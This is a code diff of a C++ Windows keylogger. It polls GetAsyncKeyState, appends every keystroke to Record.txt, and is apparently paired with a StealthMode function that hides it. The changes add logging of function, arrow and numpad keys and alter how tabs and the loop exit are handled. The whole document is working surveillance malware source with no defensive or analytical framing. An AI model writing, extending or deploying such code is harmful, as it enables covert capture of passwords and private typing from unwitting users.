@@ -13,13 +13,10 @@ void key()
 
     for (;;)
     {
-
         for (c = 8; c <= 222; c++)
         {
-
             if (GetAsyncKeyState(c) == -32767)
             {
-
                 ofstream write("Record.txt", ios::app);
 
                 if (((c > 64) && (c < 91)) && !(GetAsyncKeyState(0x10)))
@@ -37,7 +34,6 @@ void key()
                 }
                 else
                 {
-
                     switch (c)
                     {
                     case 48:
@@ -132,7 +128,6 @@ void key()
                             write << "9";
                     }
                     break;
-
                     case VK_SPACE:
                         write << " ";
                         break;
@@ -140,7 +135,7 @@ void key()
                         write << "\n";
                         break;
                     case VK_TAB:
-                        write << "  ";
+                        write << "\t";
                         break;
                     case VK_BACK:
                         write << "<BACKSPACE>";
@@ -149,14 +144,120 @@ void key()
                         write << "<Del>";
                         break;
 
+                    // Add cases for function keys (F1 to F12)
+                    case VK_F1:
+                        write << "<F1>";
+                        break;
+                    case VK_F2:
+                        write << "<F2>";
+                        break;
+                    case VK_F3:
+                        write << "<F3>";
+                        break;
+                    case VK_F4:
+                        write << "<F4>";
+                        break;
+                    case VK_F5:
+                        write << "<F5>";
+                        break;
+                    case VK_F6:
+                        write << "<F6>";
+                        break;
+                    case VK_F7:
+                        write << "<F7>";
+                        break;
+                    case VK_F8:
+                        write << "<F8>";
+                        break;
+                    case VK_F9:
+                        write << "<F9>";
+                        break;
+                    case VK_F10:
+                        write << "<F10>";
+                        break;
+                    case VK_F11:
+                        write << "<F11>";
+                        break;
+                    case VK_F12:
+                        write << "<F12>";
+                        break;
+                    // Add cases for arrow keys
+                    case VK_UP:
+                        write << "<Up>";
+                        break;
+                    case VK_DOWN:
+                        write << "<Down>";
+                        break;
+                    case VK_LEFT:
+                        write << "<Left>";
+                        break;
+                    case VK_RIGHT:
+                        write << "<Right>";
+                        break;
+
+                        // Add cases for other special keys you wish to log
+                        // For example, Shift, Ctrl, Alt, CapsLock, etc.
+                        // Use VK_SHIFT, VK_CONTROL, VK_MENU, VK_CAPITAL, etc.
+                        // Numpad keys
+                    case VK_NUMPAD0:
+                        write << "0";
+                        break;
+                    case VK_NUMPAD1:
+                        write << "1";
+                        break;
+                    case VK_NUMPAD2:
+                        write << "2";
+                        break;
+                    case VK_NUMPAD3:
+                        write << "3";
+                        break;
+                    case VK_NUMPAD4:
+                        write << "4";
+                        break;
+                    case VK_NUMPAD5:
+                        write << "5";
+                        break;
+                    case VK_NUMPAD6:
+                        write << "6";
+                        break;
+                    case VK_NUMPAD7:
+                        write << "7";
+                        break;
+                    case VK_NUMPAD8:
+                        write << "8";
+                        break;
+                    case VK_NUMPAD9:
+                        write << "9";
+                        break;
+
+                    // Numpad special keys
+                    case VK_MULTIPLY:
+                        write << "*";
+                        break;
+                    case VK_ADD:
+                        write << "+";
+                        break;
+                    case VK_SUBTRACT:
+                        write << "-";
+                        break;
+                    case VK_DECIMAL:
+                        write << ".";
+                        break;
+                    case VK_DIVIDE:
+                        write << "/";
+                        break;
+
                     default:
                         write << c;
                     }
                 }
+                write.close();
+                break; // Be mindful of this break; it exits the loop after logging a key press
             }
         }
     }
 }
+
 void StealthMode()
 {
     HWND stealth;
